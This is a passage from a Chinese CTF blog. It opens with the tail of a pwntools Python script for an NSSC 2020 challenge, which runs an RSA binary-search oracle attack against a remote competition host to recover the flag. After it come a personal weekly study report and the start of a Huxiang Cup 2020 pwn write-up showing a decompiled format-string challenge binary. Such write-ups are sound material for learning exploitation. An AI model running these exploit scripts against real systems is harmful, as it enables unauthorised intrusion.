class="number">10</span>)</span><br><span class="line">    C = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    li(<span class="string">&#x27;n: &#x27;</span> + <span class="built_in">str</span>(n))</span><br><span class="line">    li(<span class="string">&#x27;nn: &#x27;</span> + <span class="built_in">str</span>(nn))</span><br><span class="line">    li(<span class="string">&#x27;c &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line">    sl(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    tmp1 = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">10</span>)</span><br><span class="line">    li(<span class="string">&#x27;tmp1 &#x27;</span> + <span class="built_in">str</span>(tmp1))</span><br><span class="line">    </span><br><span class="line">    sl(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(tmp1 + n))</span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    scret = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = nn</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(l != r):</span><br><span class="line">        C = C * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">65537</span>, nn) % nn</span><br><span class="line">        ret = get(scret, C)</span><br><span class="line">        li(<span class="string">&#x27;times:&#x27;</span> + <span class="built_in">str</span>(i) +<span class="string">&#x27; ret: &#x27;</span> + <span class="built_in">str</span>(ret))</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">0</span>):</span><br><span class="line">            r = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = (l + r) // <span class="number">2</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    l = <span class="built_in">int</span>(l)</span><br><span class="line">    l1 = l - <span class="number">1</span></span><br><span class="line">    l2 = l + <span class="number">1</span></span><br><span class="line">    li(<span class="string">&#x27;GET FLAG:\n&#x27;</span> + <span class="built_in">str</span>(l))</span><br><span class="line">    li(<span class="string">&#x27;flag: &#x27;</span> + <span class="built_in">str</span>(l))</span><br><span class="line">    li(<span class="string">b&#x27;flag: &#x27;</span> + long_to_bytes(l))</span><br><span class="line">    li(<span class="string">b&#x27;flag: &#x27;</span> + long_to_bytes(l1))</span><br><span class="line">    li(<span class="string">b&#x27;flag: &#x27;</span> + long_to_bytes(l2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">    ia()</span><br><span class="line">    c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;119.3.152.203&#x27;</span>, <span class="number">7001</span>)</span><br><span class="line"></span><br><span class="line">    exploit()</span><br><span class="line">    finish()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/11/06/wp-nssc-2020/" data-id="ckhemv82x003awdcm6cpff5p4" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-weekly-report-3" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/01/weekly-report-3/" class="article-date">
  <time datetime="2020-11-01T15:30:30.000Z" itemprop="datePublished">2020-11-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/life/">life</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="2020-11-01周报"><a href="#2020-11-01周报" class="headerlink" title="2020-11-01周报"></a>2020-11-01周报</h1><h2 id="名句"><a href="#名句" class="headerlink" title="名句"></a>名句</h2><p>有时，成功就在我们眼前，但却被我们所忽略，以致最终地丧失。把握眼前，坚持做好每件事，那么，成功将会离我们越来越近。</p>
<h2 id="这周干了什么？"><a href="#这周干了什么？" class="headerlink" title="这周干了什么？"></a>这周干了什么？</h2><p>这周感觉干的事比上周多好多，这周后面主要是在打比赛，xnuca ctf差3名就可进线下，题目难度比较高，我也是头次干到凌晨不睡觉。远程环境问题就卡了我好久。。。总之学到了不少</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>学习dl_runtime_resolve x64攻击方法</p>
<p>因为学校内极客比赛,当时好多新生没做出来，我也没咋个学这个攻击方法，刚好来练手。</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>调试linux-qq崩溃问题</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>学习堆栈迁移至堆的利用技巧</p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>学习glibc 2.29 与2.31的简单保护绕过</p>
<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>打xnuca ctf比赛，一直在做parsec，一个解释器的pwn，搞到凌晨5点</p>
<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>打xnuca ctf比赛，parsec利用成功了，一直卡在打远程打不通，下午终于通了, 比赛结束了咱们队伍23名，差三名就可进线下…</p>
<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>打湖湘杯比赛，总的4道，干出了三道。。。实验室里的好多都进线下了，我理论初赛没过，因为昨天在打xnuca比赛，没太注意。</p>
<h2 id="下周计划干什么"><a href="#下周计划干什么" class="headerlink" title="下周计划干什么?"></a>下周计划干什么?</h2><p>复现 bytectf 的赛题</p>
<p>打铁三比赛</p>
<p>弄一下pwn环境问题</p>
<h2 id="自我反思"><a href="#自我反思" class="headerlink" title="自我反思"></a>自我反思</h2><h3 id="好好学习"><a href="#好好学习" class="headerlink" title="好好学习"></a>好好学习</h3><p>把学校里的课程学好，自己上课不听讲，感觉就是在让时间白白流逝，上课这点时间看ctf书籍也看不深入，做啥啥不是，只能好好学习。</p>
<h3 id="调整心态"><a href="#调整心态" class="headerlink" title="调整心态"></a>调整心态</h3><p>自己从大一到现在，感觉一事无成，是自己太懒和没好好学习的结果，web那边都去大厂实习了，拿到多个src平台的证书，自己感觉就还在原地转圈圈。。。大三的师傅们去年在这个时候拿到了多项比赛奖项，而我却一张也拿不出，努力加油吧，认真学习和整理每次比赛的漏洞利用思路。</p>
<h3 id="看通知"><a href="#看通知" class="headerlink" title="看通知"></a>看通知</h3><p>我感觉每一次学校通知啥，自己都不知道。。。每天晚上看一下班群通知</p>
<h3 id="调整作息规律"><a href="#调整作息规律" class="headerlink" title="调整作息规律"></a>调整作息规律</h3><p>每天有时候半夜3才睡觉, 大部分时间都是12点睡, 然后早上的若没课的话都基本9:30起</p>
<p>调整作息为: 11:40过后睡觉, 7:00起床。</p>
<h3 id="坚持学习英语"><a href="#坚持学习英语" class="headerlink" title="坚持学习英语"></a>坚持学习英语</h3><p>每天早上都去背下四级单词</p>
<h3 id="多多复现与调试一下历年的CVE"><a href="#多多复现与调试一下历年的CVE" class="headerlink" title="多多复现与调试一下历年的CVE"></a>多多复现与调试一下历年的CVE</h3><p>自己在cve方面的相关利用与调试手段十分欠缺，需要多多分析与调试，才能理解其中漏洞利用的原理。</p>
<h3 id="规划自己的时间"><a href="#规划自己的时间" class="headerlink" title="规划自己的时间"></a>规划自己的时间</h3><p>详细计划各个时间段该干什么。有时候我发现自己本来打算做这样事的突然另一件事来了，然后去做另一个事，最后到头来啥事也没完成。。。</p>
<h3 id="学会总结自己"><a href="#学会总结自己" class="headerlink" title="学会总结自己"></a>学会总结自己</h3><p>进入大学以来，我就没好好总结自己，感觉对未来一片迷茫。。。每天都在虚度着。。。以后每天晚上睡觉之前就想想自己今天干了些啥吧，反思自己今天所做的事。</p>
<h3 id="不要和别人互吹"><a href="#不要和别人互吹" class="headerlink" title="不要和别人互吹"></a>不要和别人互吹</h3><p>自己实力又差，干嘛要吹别人如何如何，管好自己才是真的厉害!!!</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/11/01/weekly-report-3/" data-id="ckhemv81h0020wdcm0d1ngj30" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/life/" rel="tag">life</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-xhb-2020" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/01/wp-xhb-2020/" class="article-date">
  <time datetime="2020-11-01T15:05:08.000Z" itemprop="datePublished">2020-11-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="湖湘杯"><a href="#湖湘杯" class="headerlink" title="湖湘杯"></a>湖湘杯</h1><h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>这一次比赛可惜没有过初赛的理论赛都没过，没注意湖湘杯理论赛。<del>~</del>今天打这个湖湘杯, 我的师傅与我的同学都进线下了….@_@。不管怎样，下次好好加油。。。这次比赛出现简单题目分值高，怪了。。。</p>
<h2 id="pwn1-pwn-printf"><a href="#pwn1-pwn-printf" class="headerlink" title="pwn1 [pwn_printf]"></a>pwn1 [pwn_printf]</h2><p><a href="">下载</a></p>
<p>保护</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>主函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-100A8h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-100A0h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-10098h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-10090h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-10088h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-10080h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-10078h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-10070h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 *vul_size; <span class="comment">// [rsp+48h] [rbp-10068h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+60h] [rbp-10050h]</span></span><br><span class="line">  <span class="keyword">char</span> *format; <span class="comment">// [rsp+10068h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">void</span> *dest; <span class="comment">// [rsp+10070h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+10078h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1007Ch] [rbp-34h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  dest = mmap((<span class="keyword">void</span> *)<span class="number">0x4000000</span>, <span class="number">0x4000000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, <span class="string">&quot;%1$00038s%3$hn%1$65498s%1$57344s%7$hn&quot;</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">74</span>, <span class="string">&quot;%1$00121s%3$hn%1$65415s%1$57344s%1$00064s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">121</span>, <span class="string">&quot;%1$00164s%3$hn%1$65372s%1$*5$s%1$*8$s%9$hn&quot;</span>, <span class="number">0x2B</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">164</span>, <span class="string">&quot;%1$00209s%3$hn%1$65327s%1$*8$s%1$65432s%9$hn&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">209</span>, <span class="string">&quot;%8$c%1$01889s%2$c%4$s%1$63890s%3$hn&quot;</span>, <span class="number">0x24</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">245</span>, <span class="string">&quot;%1$00292s%3$hn%1$65244s%1$57344s%1$00008s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">292</span>, <span class="string">&quot;%1$00330s%3$hn%1$65206s%1$*5$s%11$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">330</span>, <span class="string">&quot;%1$00377s%3$hn%1$65159s%1$57344s%1$00096s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">377</span>, <span class="string">&quot;%1$00425s%3$hn%1$65111s%1$*5$s%1$*10$s%11$hn&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">425</span>, <span class="string">&quot;%1$00472s%3$hn%1$65064s%1$*10$s%1$65439s%11$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">472</span>, <span class="string">&quot;%10$c%1$01625s%2$c%4$s%1$64418s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">509</span>, <span class="string">&quot;%1$00556s%3$hn%1$64980s%1$57344s%1$00016s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">556</span>, <span class="string">&quot;%1$00593s%3$hn%1$64943s%1$*5$s%13$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">593</span>, <span class="string">&quot;%1$00645s%3$hn%1$64891s%1$57344s%1$00048s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">645</span>, <span class="string">&quot;%1$00690s%3$hn%1$64846s%1$*5$s%1$*12$s%13$hn&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">690</span>, <span class="string">&quot;%1$00737s%3$hn%1$64799s%1$*12$s%1$65424s%13$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">737</span>, <span class="string">&quot;%12$c%1$01360s%2$c%4$s%1$64948s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">774</span>, <span class="string">&quot;%1$00821s%3$hn%1$64715s%1$57344s%1$00024s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">821</span>, <span class="string">&quot;%1$00858s%3$hn%1$64678s%1$*5$s%15$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">858</span>, <span class="string">&quot;%1$00905s%3$hn%1$64631s%1$57344s%1$00120s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">905</span>, <span class="string">&quot;%1$00950s%3$hn%1$64586s%1$*5$s%1$*14$s%15$hn&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">950</span>, <span class="string">&quot;%1$00997s%3$hn%1$64539s%1$*14$s%1$65424s%15$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">997</span>, <span class="string">&quot;%14$c%1$01097s%2$c%4$s%1$65474s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1037</span>, <span class="string">&quot;%1$01084s%3$hn%1$64452s%1$57344s%1$00032s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1084</span>, <span class="string">&quot;%1$01121s%3$hn%1$64415s%1$*5$s%17$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1121</span>, <span class="string">&quot;%1$01168s%3$hn%1$64368s%1$57344s%1$00112s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1168</span>, <span class="string">&quot;%1$01215s%3$hn%1$64321s%1$*5$s%1$*16$s%17$hn&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1215</span>, <span class="string">&quot;%1$01262s%3$hn%1$64274s%1$*16$s%1$65415s%17$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1262</span>, <span class="string">&quot;%16$c%1$00835s%2$c%4$s%1$00462s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1299</span>, <span class="string">&quot;%1$01346s%3$hn%1$64190s%1$57344s%1$00040s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1346</span>, <span class="string">&quot;%1$01383s%3$hn%1$64153s%1$*5$s%19$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1383</span>, <span class="string">&quot;%1$01430s%3$hn%1$64106s%1$57344s%1$00056s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1430</span>, <span class="string">&quot;%1$01475s%3$hn%1$64061s%1$*5$s%1$*18$s%19$hn&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1475</span>, <span class="string">&quot;%1$01522s%3$hn%1$64014s%1$*18$s%1$65424s%19$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1522</span>, <span class="string">&quot;%18$c%1$00575s%2$c%4$s%1$00982s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1559</span>, <span class="string">&quot;%1$01606s%3$hn%1$63930s%1$57344s%1$00072s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1606</span>, <span class="string">&quot;%1$01643s%3$hn%1$63893s%1$*5$s%21$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1643</span>, <span class="string">&quot;%1$01690s%3$hn%1$63846s%1$57344s%1$00088s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1690</span>, <span class="string">&quot;%1$01735s%3$hn%1$63801s%1$*5$s%1$*20$s%21$hn&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1735</span>, <span class="string">&quot;%1$01782s%3$hn%1$63754s%1$*20$s%1$65417s%21$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1782</span>, <span class="string">&quot;%20$c%1$00315s%2$c%4$s%1$01502s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1819</span>, <span class="string">&quot;%1$01866s%3$hn%1$63670s%1$57344s%1$00080s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1866</span>, <span class="string">&quot;%1$01906s%3$hn%1$63630s%1$*5$s%23$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1906</span>, <span class="string">&quot;%1$01953s%3$hn%1$63583s%1$57344s%1$00104s%7$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1953</span>, <span class="string">&quot;%1$01998s%3$hn%1$63538s%1$*5$s%1$*22$s%23$hn&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">1998</span>, <span class="string">&quot;%1$02045s%3$hn%1$63491s%1$*22$s%1$65426s%23$hn&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2045</span>, <span class="string">&quot;%22$c%1$00052s%2$c%4$s%1$02028s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2082</span>, <span class="string">&quot;%1$02120s%3$hn%1$63416s%1$00032s%6$hn&quot;</span>, <span class="number">0x26</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2120</span>, <span class="string">&quot;%1$65534s%3$hn&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2135</span>, <span class="string">&quot;%8$c%1$00525s%2$c%4$s%1$01644s%3$hn&quot;</span>, <span class="number">0x24</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2171</span>, <span class="string">&quot;%1$02209s%3$hn%1$63327s%1$00004s%6$hn&quot;</span>, <span class="number">0x26</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2209</span>, <span class="string">&quot;%10$c%1$00450s%2$c%4$s%1$01794s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2246</span>, <span class="string">&quot;%1$02284s%3$hn%1$63252s%1$00004s%6$hn&quot;</span>, <span class="number">0x26</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2284</span>, <span class="string">&quot;%12$c%1$00374s%2$c%4$s%1$01946s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2322</span>, <span class="string">&quot;%1$02360s%3$hn%1$63176s%1$00004s%6$hn&quot;</span>, <span class="number">0x26</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2360</span>, <span class="string">&quot;%14$c%1$00299s%2$c%4$s%1$02096s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2397</span>, <span class="string">&quot;%1$02435s%3$hn%1$63101s%1$00004s%6$hn&quot;</span>, <span class="number">0x26</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + 